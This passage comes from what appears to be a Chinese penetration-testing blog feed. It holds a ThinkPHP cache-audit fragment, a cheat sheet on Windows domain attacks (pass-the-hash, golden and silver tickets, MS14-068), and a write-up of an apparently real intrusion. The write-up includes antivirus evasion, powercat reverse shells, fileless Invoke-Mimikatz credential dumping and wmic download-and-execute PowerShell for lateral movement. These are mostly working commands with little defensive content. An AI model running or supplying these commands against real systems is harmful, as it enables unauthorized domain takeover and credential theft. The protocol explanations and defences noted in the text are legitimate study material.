title="缓存漏洞"></a><strong>缓存漏洞</strong></h4><p>在ThinkPHP3.2中，缓存函数有F方法和S方法，两个方法有什么区别呢，官方介绍如下</p><pre><code>F方法：相当于PHP自带的file_put_content和file_get_content函数，没有太多存在时间的概念，是文件存储数据的方式。常用于文件配置。S方法：文件缓存，有生命时长，时间到期后缓存内容会得到更新。常用于单页面data缓存。</code></pre><p>这里F方法就不介绍了，直接看S方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">S</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进查看S方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/14.png" alt="" loading="lazy"></p><p>set方法写入缓存</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/15.png" alt="" loading="lazy"></p><p>跟进filename方法，此方法获取写入文件的路径，保存在../Application/Runtime/Temp目录下</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">filename</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$name</span>    <span class="token operator">=</span>    <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_CACHE_KEY'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_CACHE_SUBDIR'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 使用子目录</span>            <span class="token variable">$dir</span>   <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_PATH_LEVEL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$dir</span>    <span class="token punctuation">.</span><span class="token operator">=</span>    <span class="token variable">$name</span><span class="token punctuation">{</span><span class="token variable">$i</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">,</span><span class="token number">0755</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$filename</span>    <span class="token operator">=</span>    <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$filename</span>    <span class="token operator">=</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>并将S传入的name进行md5值作为文件名，最终通过file_put_contents函数写入文件。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/16.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;where注入&quot;&gt;&lt;a href=&quot;#where注入&quot; class=&quot;headerlink&quot; title=&quot;where注入&quot;&gt;&lt;/a&gt;&lt;strong&gt;where注入&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在控制器中，写个demo，利用字符串方式作为where传参时存在注
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>内网域渗透知识总结</title>
    <link href="http://yoursite.com/2019/12/31/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/12/31/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</id>
    <published>2019-12-31T03:30:29.000Z</published>
    <updated>2020-04-29T05:17:33.373Z</updated>
    
    <content type="html"><![CDATA[<h4 id="NTML协议"><a href="#NTML协议" class="headerlink" title="NTML协议"></a><strong>NTML协议</strong></h4><p>在工作组中，密码hash保存在本地的SAM文件中(%SystemRoot%\system32\config\sam)，在域里保存在ntds.dit文件中，hash的格式为：<code>用户名称:SID:LM-Hash值:NT-Hash值</code></p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:32057716c8bd0647d9197a9db0b041eb:::</code></pre><p>500冒号后面的是LM hash，32057716c8bd0647d9197a9db0b041eb是ntml hash</p><h5 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a><strong>LM Hash</strong></h5><p>LM Hash的全称是LAN Manager Hash，如果明文是<code>dbnames</code>，先要全部转换成大写，然后将大写字符串转换成16进制，如果明文大写转换的二进制不足14个字节，需要用0在后面添加到14个字节</p><pre><code>44424e414d455300000000000000    dbnames的16进制为44424e414d4553</code></pre><p>由于44424e414d4553转换二进制为8字节，所以这两个8字节数据要用魔术字符串<code>KGS!@#$%</code>DES加密</p><pre><code>4B47532140232425     为&#39;KGS!@#$%&#39;的16进制</code></pre><p>将得到的2个8字节作为key对KGS!@#$%进行des加密，可以利用安全客的一篇文章进行<a href="https://www.anquanke.com/post/id/193149#h3-2" target="_blank" rel="noopener">des加密</a></p><pre><code>44424e414d4553作为key为&#39;KGS!@#$%&#39;进行des加密：c8b9d6dc8e553d6300000000000000作为key为&#39;KGS!@#$%&#39;进行des加密：aad3b435b51404ee</code></pre><h5 id="NTML-Hash"><a href="#NTML-Hash" class="headerlink" title="NTML Hash"></a><strong>NTML Hash</strong></h5><p>从Windows Vista开始，密码默认情况是只有存储NTML Hash，LM Hash不会存在，在NTML Hash中，先将字符串进行16进制转换，然后在转换成unicode字符串，最后使用MD4加密算法对Unicode进行加密，所以LM Hash跟NTML相比，LM明文大小写不敏感，可以判断明文是否小于8位，不使用‘KGS!@#$%’作为key进行des加密，而NTML采用单向加密方式(MD4)</p><h5 id="NTML认证协议"><a href="#NTML认证协议" class="headerlink" title="NTML认证协议"></a><strong>NTML认证协议</strong></h5><p>NTML协议认证分为三部分：协商、质询、身份验证验证</p><pre><code>                            1.协商Client &lt;----------------------------------------------------&gt;server                            2.质询(challenge)Client &lt;----------------------------------------------------&gt;server                            3.身份验证Client &lt;----------------------------------------------------&gt;server</code></pre><p>NTML协议认证过程：</p><p>1.用户输入账号密码，客户端中包含明文用用户名向服务端发起请求</p><p>2.服务端接收到客户端的请求，会生成一个challenge 16位随机数，使用存储的NTML Hash加密challenge，生成challenge1，然后将challenge的16位明文随机数发送给客户端</p><p>3.客户端接收到challenge后，使用用户登录的密码hash加密challenge生成response(challenge2)，将这个response发送给客户端</p><p>4.服务端接收到response，对challenge1和challenge2进行比较，相同的话就验证成功</p><h5 id="NTLM-v1与NTLM-v2"><a href="#NTLM-v1与NTLM-v2" class="headerlink" title="NTLM v1与NTLM v2"></a><strong>NTLM v1与NTLM v2</strong></h5><p>challenge：NTML v1是8的随机数；NTML v2是16位的随机数</p><p>Net-NTML Hash：</p><p>1.NTML v1采用的是DES加密，在16字节后面填充5个0，组成21字节，然后分成3组7个字节的，并在每7个字节后面填充1个0，成为3个8字节的DES密钥，加密上诉步骤2(server)发来的challenge，组成24字节的密文。</p><p>2.NTML v2采用的HMAC-MD5加密</p><h4 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a><strong>Kerberos协议</strong></h4><p>在域环境中，主要采用的是kerberos协议，主要有下面几个角色</p><p>1.AS：为客户端生成TGT服务</p><p>2.TGS：为客户端生成某个服务的ticket</p><p>3.KDC：安全认证中票据生成管理服务，里面包含AS和TGS</p><p>4.AD：存储整个域内的所有计算机，用户等信息</p><h5 id="Kerberos协议认证过程"><a href="#Kerberos协议认证过程" class="headerlink" title="Kerberos协议认证过程"></a><strong>Kerberos协议认证过程</strong></h5><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201912/31/102901ze0er0rhuutesc5y.png.thumb.jpg" alt="1" loading="lazy"></p><p>1.客户端向KDC(AS)发起一个认证请求(KRB_AS_REQ)，在请求的过程中，是通过用户的密码hash加密的时间戳，然后发送给AS服务器，AS服务器接收到后，采用服务器那边的密码hash进行解密这个时间戳，解密成功后，并且时间戳在一定时间范围，说明认证成功。<br> 2.AS对比用户是否在本地数据库中，使用客户端的hash进行解密，正确就返回krbtgt的密码hash加密的TGT票据(到期时间一般为8小时)，用户是无法解密这个TGT票据的，但是有了krbtgt的hash，就可以伪造’黄金票据’。还要返回一个由客户端用户ntml hash加密的Session Key(sessionkey1)，Session  Key是KDC接收请求后的随机生成的字符(KRB_AS_REP)。<br> 3.客户端用自己的密码hash解密Session Key，TGT是KDC加密的，Client无法解密，Client拿着解密出来的SessionKey去加密时间戳和TGT发送给TGS换取访问Server的票据(KRB_TGS_REQ)。<br> 4.TGS收到Client的请求后，会验证是否存在客户端要访问的这个服务，存在的话KDC使用krbtgt的密码hash对TGT进行解密，然后会查看TGT中的时间戳，看是否TGT失效，如果解密成功的TGT没有失效，向客户端发送通过sessionkey1加密的Session_key和ticket票据，在TGSREP中，用的是服务的hash加密ticket的，所有我们拥有这个服务的hash就可以制作一个ticket(即白银票据)(KRB_TGS_REP)。<br> 5.客户端拿着自己sessionkey1解密的Session_Key(sessionkey2)，然后把sessionkey2加密的时间戳和ticket发送个Server去访问服务，认证通过就可以访问(KRB_AP_REQ)。<br> 6.服务使用自己的hash去解密ticket票据，得到sessionkey2，在用sessionkey2去解密时间戳，解密成功，就用PAC去KDC问客户端是否有访问的权限，域控解密PAC，用于让客户端识别是否访问正确的服务端(KRB_AP_REP)。</p><h4 id="内网横向移动的方法"><a href="#内网横向移动的方法" class="headerlink" title="内网横向移动的方法"></a><strong>内网横向移动的方法</strong></h4><h5 id="ipc连接"><a href="#ipc连接" class="headerlink" title="ipc连接"></a><strong>ipc连接</strong></h5><pre><code>net use \\192.168.1.232\C$ admin123456 /user:fanxing.com\fanxing</code></pre><p>复制文件到主机上</p><pre><code>copy 1.bat \\192.168.1.232\c$\tools</code></pre><p>获取服务器的时间</p><pre><code>net time \\192.168.1.232</code></pre><p>创建计划任务，20:05执行1.bat文件，cobaltstrike上线成功</p><pre><code>at \\192.168.1.232 20:05 c:\tools\1.bat</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/3.png" alt="" loading="lazy"></p><p>下面是ipc连接当中常见的错误号：</p><pre><code>错误号5：拒绝访问---&gt;使用的权限太低，需要提权错误号51：Windows无法找到网络路径，网络有问题错误号53：找不到网络路径，ip地址错误、目标未开机、目标lanmanserver服务未开启、目标有防火墙(端口过滤)错误号67：找不到网络名-&gt;你的lanmanworkstation服务未启动或者目标删除了ipc$错误号1219：提供的凭据与已存在的凭据集冲突-&gt;你已经和对方建立了一个ipc，请删除在连接错误号1326：未知的用户名或错误密码错误号1792：试图登录，但是网络登录服务没启动-&gt;目标BetLogon服务未启动错误号2242：此用户的密码已经过期-&gt;目标有账号策略，强制定期要求更改密码</code></pre><h5 id="schtasks创建计划任务"><a href="#schtasks创建计划任务" class="headerlink" title="schtasks创建计划任务"></a><strong>schtasks创建计划任务</strong></h5><p>设置每天晚上8:40执行1.bat文件</p><pre><code>schtasks /create /s 192.168.1.232 /u fanxing.com\fanxing /p admin@163.com /ru &quot;SYSTEM&quot; /tn fanxing /sc DAILY /st 20:40  /tr c:\tools\1.bat /F</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/4.png" alt="" loading="lazy"></p><h5 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a><strong>WMI</strong></h5><p>wmi服务需要开启135端口，这个是默认开启的。</p><pre><code>wmic /node:192.168.1.232 /user:fanxing.com\fanxing /password:admin@163.com process call create &quot;cmd /c 1.exe&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/5.png" alt="" loading="lazy"></p><p>使用wmic没有任何回显，可以wmicexec.vbs解决无回显的问题，或者获取一个半交互式shell。</p><pre><code>cscript wmiexec.vbs /cmd 192.168.1.232 fanxing.com\fanxing admin@163.com whoami</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/6.png" alt="" loading="lazy"></p><h5 id="pstools"><a href="#pstools" class="headerlink" title="pstools"></a><strong>pstools</strong></h5><p>pstools中有13个小工具，这里主要利用psexec进行远程执行命令，唯一的缺点就是会开启一个服务，容易被管理员发现。</p><p>在ipc建立连接的时候，可以直接使用psexec:</p><pre><code>psexec.exe \\192.168.1.232 -h cmd /c &quot;whoami&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/7.png" alt="" loading="lazy"></p><p>当ipc没有连接时</p><pre><code>Psexec.exe \\192.168.1.232 -u fanxing.com\fanxing -p admin@163.com -h cmd /c &quot;whoami&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/8.png" alt="" loading="lazy"></p><p>使用metasploit执行</p><pre><code>use auxiliary/admin/smb/p**ec_commandset rhosts 192.168.1.232set smbuser fanxingset smbpass admin@163.comset smbdomain fanxing.comset command whoami</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/9.png" alt="" loading="lazy"></p><h5 id="hash传递-PTH"><a href="#hash传递-PTH" class="headerlink" title="hash传递(PTH)"></a><strong>hash传递(PTH)</strong></h5><p>hash传递是通过密码的hash访问主机或者服务，不需要明文登录。hash的原理，出现在上面讲的NTML认证过程的challenge。利用metasploit：</p><pre><code>use exploit/windows/smb/psexecset rhosts 192.168.50.233set SMBPass 32057716c8bd0647d9197a9db0b041ebset SMBUser administratorset SMBDomain fanxing.com</code></pre><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a><strong>黄金票据</strong></h4><p>黄金票据是AS颁发给Client的TGT票据(TGT的有效时间为20分钟)，是通过域kerberos账户(KRBTGT)加密的。实现原理就是跳过了AS的认证过程，直接向KDC的TGS服务证明通过了AS服务。一般黄金票据都是域控的权限掉了的时候，修改了域控的密码，而krbtgt的密码没有被修改，就可以重新获取到域控权限。</p><p>满足黄金票据的条件有：</p><p>1.域的名称</p><p>2.域的SID值</p><p>3.域中KRBTGT的密码hash</p><p>4.伪造的用户名</p><p>在金票的利用过程中，可以使用mimikatz，cobaltstrike，metasploit来伪造。</p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><strong>Mimikatz</strong></h5><p>导出krbtgt的NTML Hash</p><pre><code>privilege::debug      #提权lsadump::dcsync /domain:fanxing.com /user:krbtgt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/10.png" alt="" loading="lazy"></p><p>获取域的SID值，不要后面的-500</p><pre><code>whoami /all</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/11.png" alt="" loading="lazy"></p><p>伪造金票</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /aes256:3df036f90aaf3a63a5cce96fc753f08beb5a2e61946e17cc7d5e6ce04b651b89 /user:fanxing /ticket:gold.kirbi</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/12.png" alt="" loading="lazy"></p><p>导入Golden Ticket</p><pre><code>kerberos::ptt c:\users\test\gold.kirbi</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/13.png" alt="" loading="lazy"></p><p>可以使用dir访问域控目录，要输入主机名，使用ip还是访问不到</p><pre><code>dir \\WIN-M34UCFJIPNQ\c$</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/14.png" alt="" loading="lazy"></p><p>mimikatz还有另外一中方法</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /rc4:8b3955c065502e33716d555d4421a723 /user:fanxing /ptt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/15.png" alt="" loading="lazy"></p><h5 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a><strong>CobaltStrike</strong></h5><p>在上线之后-&gt;执行-&gt;黄金票据</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/16.png" alt="" loading="lazy"></p><h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><strong>Metasploit</strong></h5><p>msf制作金票</p><pre><code>load kiwi</code></pre><p>生成Golden Ticket</p><pre><code>golden_ticket_create -d fanxing.com -k 8b3955c065502e33716d555d4421a723 -s S-1-5-21-3408186607-3793295459-3581146574 -u fanxing -t /tmp/golden.ticket</code></pre><p>将票据导入内存中</p><pre><code>kerberos_ticket_use /tmp/golden.ticket</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/17.png" alt="" loading="lazy"></p><p>dir访问目录成功</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/18.png" alt="" loading="lazy"></p><p>金票的创建，需要krbtgt的密码ntml hash，对于防御，只要定期的修改krbtgt的密码，就能使金票失效。</p><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a><strong>白银票据</strong></h4><p>白银票据是TGS颁发给Client的ST票据，根据kerberos协议第5步，Server会对Clinet的ST票据利用Client的hash解密，所以这个过程不需要经过KDC，而且只能访问Server的服务一次。</p><p>满足一下条件，即可以伪造银票：</p><p>1.域的名称</p><p>2.域的SID值</p><p>3.域服务的NTML Hash</p><p>4.要伪造的用户名</p><p>5.目标服务器的kerberos服务</p><p>常用的服务名有</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/19.png" alt="" loading="lazy"></p><p>伪造银票</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /target:WIN-M34UCFJIPNQ.fanxing.com /service:cifs /rc4:dcd87fc42d9d8ac03dec5931a55ddd59 /user:fanxing /ptt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/20.png" alt="" loading="lazy"></p><p>对于银票的防御措施可以开启PAC，PAC只能KDC制作和查看，在注册表中添加一个ValidateKdcPacSignature为1</p><pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/21.png" alt="" loading="lazy"></p><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a><strong>MS14-068</strong></h4><p>Client向AS申请一张不包含PAC的TGT票据，会伪造一个PAC，在TGS_REP中，对伪造的PAC验证成功后，会返回一个新的TGT票据。</p><p>通过<a href="https://github.com/abatchy17/Window**ploits/tree/master/MS14-068" target="_blank" rel="noopener">MS14-068exp</a>利用</p><pre><code>MS14-068.exe -u 当前域用户@域名称 -p 当前域用户密码 -s sid值 -d 域控ip</code></pre><p>sid值通过whoami /all获取</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/22.png" alt="" loading="lazy"></p><p>然后会在目录下生成一个证书，利用mimikatz</p><pre><code>kerberos::ptc C:\wwwroot\TGT_xxxxx@fanxing.com.ccache</code></pre><p>就可以使用dir访问到域控的目录</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/23.png" alt="" loading="lazy"></p><p>对于ms14-068的防御可以打补丁KB3011780和使用winserver2012</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://www.anquanke.com/member/143805" target="_blank" rel="noopener">https://www.anquanke.com/member/143805</a></p><p>2.<a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;NTML协议&quot;&gt;&lt;a href=&quot;#NTML协议&quot; class=&quot;headerlink&quot; title=&quot;NTML协议&quot;&gt;&lt;/a&gt;&lt;strong&gt;NTML协议&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在工作组中，密码hash保存在本地的SAM文件中(%SystemRoot%
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>我的一次内网域渗透实战</title>
    <link href="http://yoursite.com/2019/08/14/%E6%88%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    <id>http://yoursite.com/2019/08/14/%E6%88%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</id>
    <published>2019-08-14T09:34:05.000Z</published>
    <updated>2020-04-29T07:16:59.297Z</updated>
    
    <content type="html"><![CDATA[<h4 id="CobaltStrike反弹shell"><a href="#CobaltStrike反弹shell" class="headerlink" title="CobaltStrike反弹shell"></a><strong>CobaltStrike反弹shell</strong></h4><p>通过CNVD-C-2019-48814获取到shell，由于这个网站存在ETES杀毒软件，写入jsp木马或者利用vbs，certutil，powershell下载msf木马均会被杀，这里可以利用powershell反弹shell的形式在自己的vps上获取到一个shell。具体这个漏洞怎么利用我不说了，网上很多复现文章。<br>在cobaltstrike生成一段powershell代码，插入payload</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/1.png" alt="" loading="lazy"></p><p>执行payload就会在cs上获取到一个会话</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/2.png" alt="" loading="lazy"></p><p>将cobaltstrike上的会话移到metasploit上(怎么移植，网上有很多教程)<br>在metasploit上接收到shell</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/3.png" alt="" loading="lazy"></p><h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a><strong>内网信息收集</strong></h4><p>查询域名称：net view /domain<br>查询域内计算机：net view /doamin:xx<br>查询域控制器时间：net time /domain<br>查询域管理用户：net group “domain admins” /domain<br>得到域控制主机名：net group “domain controllers” /domain<br>…..<br>获取域控主机名：net group “domain controllers” /domain</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/4.png" alt="" loading="lazy"></p><p>通过ping主机名获取域控ip地址</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/5.png" alt="" loading="lazy"></p><p>补丁情况：systeminfo</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/6.png" alt="" loading="lazy"></p><p>MS14-068打了补丁，无奈只能上mimikatz读取密码，但是有eset杀毒软件，一上传就被杀了，有没有免杀的mimikatz，幸好powershell没被拦截，通过Invoke-Mimikatz读取密码。</p><p>本地nc监听本地35602端口：</p><pre class=" language-shell"><code class="language-shell">nc -lvvp 35602</code></pre><p>在burpsuite上执行powercat反弹shell</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>powercat <span class="token operator">-</span>c ip地址 <span class="token operator">-</span>p 端口 <span class="token operator">-</span>e cmd</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/7.png" alt="" loading="lazy"></p><p>Invoke-Mimikatz读取密码</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/8.png" alt="" loading="lazy"></p><p>成功读取到域控的管理员账号密码</p><h4 id="拿下其他主机"><a href="#拿下其他主机" class="headerlink" title="拿下其他主机"></a><strong>拿下其他主机</strong></h4><p>有了域控账号密码，ip地址，就可以连接域控了，这里有很多种方法(ipc，wmic，p**ec，sc等等，这里我详细介绍3种方法)</p><h5 id="1-IPC连接"><a href="#1-IPC连接" class="headerlink" title="1.IPC连接"></a>1.IPC连接</h5><p>net use \ip地址\ipc$ 密码 /user:域控主机名\域控管理名<br>将文件copy到其他服务器上：copy 1.bat \ip地址\c$<br>获取服务器的时间：net time \ip地址<br>设置1.bat执行时间：at \ip地址 获取到的服务器时间 执行文件<br>删除ipc记录：net use \ip\ipc$ /del</p><h5 id="2-wmic"><a href="#2-wmic" class="headerlink" title="2.wmic"></a>2.wmic</h5><pre><code>wmic /node:ip地址 /user:用户名 /password:密码 process call create cmd.exe</code></pre><h5 id="3-psexec"><a href="#3-psexec" class="headerlink" title="3.psexec"></a>3.psexec</h5><pre><code>psexec \\ip地址 -u 用户名 -p 密码 cmd</code></pre><p>这里我通过wmic来连接，由于wmic没有回显</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/9.png" alt="" loading="lazy"></p><p>可以执行powershell反弹到cobaltstrike上，在移植到msf上面</p><pre class=" language-powershell"><code class="language-powershell">wmic <span class="token operator">/</span>node:ip地址 <span class="token operator">/</span>user:用户 <span class="token operator">/</span>password:密码 <span class="token keyword">process</span> call create <span class="token string">"cmd.exe /c powershell.exe -nop -w hidden -c \"</span><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'cs上生成的url'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\<span class="token string">""</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/10.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/11.png" alt="" loading="lazy"></p><p>在域控中进行下信息收集，获取域成员机器</p><pre><code>查询所有域控制器：dsquery server查询域内计算机：dsquery computer查询域用户：dsquery user查询域用户所在域组：net user 域账号 /domain查询域组所包含的用户：net group 域组名 /domain</code></pre><p>先获取域内计算机名</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/12.png" alt="" 